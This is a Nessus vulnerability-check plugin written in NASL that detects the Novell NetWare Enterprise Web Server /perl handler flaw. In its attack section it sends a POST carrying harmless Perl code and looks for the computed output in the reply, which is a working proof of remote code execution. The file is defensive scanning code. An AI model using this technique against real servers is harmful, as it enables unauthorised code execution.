# (c) 2002 visigoth <visigoth@securitycentric.com>
# GPLv2

#
# REGISTER
#

# Changes by Tenable:
# - Revised plugin title, OSVDB refs, output formatting (9/3/09)
# - Fix typo in desc (12/28/10)
# - Updated description and solution. Added CPE and updated copyright (10/18/2012)

include("compat.inc");

if(description)
{
 script_id(11158);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2002-1436", "CVE-2002-1437", "CVE-2002-1438"); 
 script_bugtraq_id(5520, 5521, 5522);
 script_osvdb_id(3717, 8942, 10928);
 
 script_name(english:"Novell NetWare Web Handler Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to several flaws." );
 script_set_attribute(attribute:"description", value:
"Novell NetWare contains multiple default web server installations.  
The NetWare Enterprise Web Server (Netscape/IPlanet) has a perl 
handler that will run arbitrary code given in a POST request. 
Versions 5.x (through SP4) and 6.x (through SP1) are affected." );
 script_set_attribute(attribute:"solution", value:
"Install 5.x SP5 or 6.0 SP2.

Additionally, the enterprise manager web interface may be used to
unmap the /perl handler entirely.  If it is not being used, minimizing
this service would be appropriate." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/08/20");
 script_cvs_date("$Date: 2012/10/18 21:52:49 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/o:novell:netware");
script_end_attributes();

 script_summary(english:"Webserver perl handler executes arbitrary POSTs");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002-2012 visigoth");
 script_family(english:"Netware");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80,2200);
 exit(0);
}

#
# ATTACK
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if (! get_port_state(port)) port = 2200;
if (! get_port_state(port)) exit(0);


http_POST = string("POST /perl/ HTTP/1.1\r\n",
	 	   "Content-Type: application/octet-stream\r\n",
		   "Host: ", get_host_name(), "\r\n",
		   "Content-Length: ");

perl_code = 'print("Content-Type: text/plain\\r\\n\\r\\n", "Nessus=", 42+42);';

length = strlen(perl_code);
data = string(http_POST, length ,"\r\n\r\n",  perl_code);
rcv = http_keepalive_send_recv(port:port, data:data);
if(!rcv) exit(0);

if("Nessus=84" >< rcv)
{
	security_hole(port);
}
